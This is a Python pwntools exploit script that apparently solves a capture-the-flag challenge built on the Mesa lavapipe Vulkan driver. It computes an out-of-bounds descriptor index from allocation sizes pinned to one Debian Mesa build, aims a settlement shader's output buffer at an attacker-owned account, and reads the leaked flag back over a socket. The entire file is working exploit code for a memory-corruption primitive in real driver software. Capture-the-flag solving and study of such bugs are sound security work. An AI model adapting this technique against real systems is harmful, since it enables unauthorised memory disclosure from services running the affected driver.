#!/usr/bin/env python3
from pwn import context, log, remote
import os
import re


context.log_level = os.environ.get("LOG", "info")

HOST = os.environ.get("HOST", "127.0.0.1")
PORT = int(os.environ.get("PORT", "1451"))
TIMEOUT = float(os.environ.get("TIMEOUT", "10"))

SETTLEMENT_ROUNDS = 64

# These constants are for the pinned Debian bookworm Mesa 22.3.6 lavapipe build
# used by the challenge Dockerfile.
LVP_DESCRIPTOR_SIZE = 32
LVP_DESCRIPTOR_SET_HEADER = 88
QUOTE_LAYOUT_DESCS = 2
QUOTE_MEMO_BYTES = 8

MARKET_OUTCOME_SLOTS = 32768
MARKET_MEMO_BYTES = 4


def align(v, a):
    return (v + a - 1) & ~(a - 1)


def derived_index():
    quote_alloc = align(
        LVP_DESCRIPTOR_SET_HEADER
        + QUOTE_LAYOUT_DESCS * LVP_DESCRIPTOR_SIZE
        + QUOTE_MEMO_BYTES,
        8,
    )

    market_descs = MARKET_OUTCOME_SLOTS + (1 if MARKET_MEMO_BYTES else 0)
    market_alloc = align(
        LVP_DESCRIPTOR_SET_HEADER
        + market_descs * LVP_DESCRIPTOR_SIZE
        + MARKET_MEMO_BYTES,
        8,
    )

    # Target settlement_book binding 1: the output storage buffer descriptor.
    return (quote_alloc + market_alloc + LVP_DESCRIPTOR_SIZE) // LVP_DESCRIPTOR_SIZE


def menu(io, choice):
    io.sendlineafter(b"> ", str(choice).encode())


def open_account(io, size):
    menu(io, 1)
    io.sendlineafter(b"bytes: ", str(size).encode())
    line = io.recvline_contains(b"account:")
    return int(line.rsplit(b":", 1)[1])


def audit_account(io, account, offset, size):
    menu(io, 3)
    io.sendlineafter(b"account: ", str(account).encode())
    io.sendlineafter(b"offset: ", str(offset).encode())
    io.sendlineafter(b"bytes: ", str(size).encode())
    line = io.recvline_regex(br"^[0-9a-f]+$")
    return bytes.fromhex(line.decode().strip())


def list_market(io, outcome_slots, memo_bytes):
    menu(io, 4)
    io.sendlineafter(b"outcome_slots: ", str(outcome_slots).encode())
    io.sendlineafter(b"memo_bytes: ", str(memo_bytes).encode())
    io.recvline_contains(b"market id:")


def open_exchange(io):
    menu(io, 5)
    io.recvline_contains(b"exchange open")


def quote_position(io, price_index, account, offset, size):
    menu(io, 6)
    io.sendlineafter(b"price_index: ", str(price_index).encode())
    io.sendlineafter(b"account: ", str(account).encode())
    io.sendlineafter(b"offset: ", str(offset).encode())
    io.sendlineafter(b"range: ", str(size).encode())
    io.recvline_contains(b"quoted")


def settle_market(io, round_id):
    menu(io, 7)
    io.sendlineafter(b"round: ", str(round_id).encode())
    line = io.recvline().strip()
    if line == b"settled":
        return True
    if line == b"bad round":
        return False
    raise RuntimeError(f"unexpected settle response: {line!r}")


def main():
    io = remote(HOST, PORT, timeout=TIMEOUT)

    leak_id = open_account(io, 256)
    list_market(io, MARKET_OUTCOME_SLOTS, MARKET_MEMO_BYTES)
    open_exchange(io)

    idx = derived_index()
    log.info("using price index %d", idx)
    quote_position(io, idx, leak_id, 0, 256)

    for word in range(SETTLEMENT_ROUNDS):
        if not settle_market(io, word):
            break

    data = audit_account(io, leak_id, 0, 256)
    flag = data.split(b"\x00", 1)[0]

    if re.fullmatch(rb"[ -~]+", flag):
        print(flag.decode())
    else:
        print(flag)

    io.close()


if __name__ == "__main__":
    main()
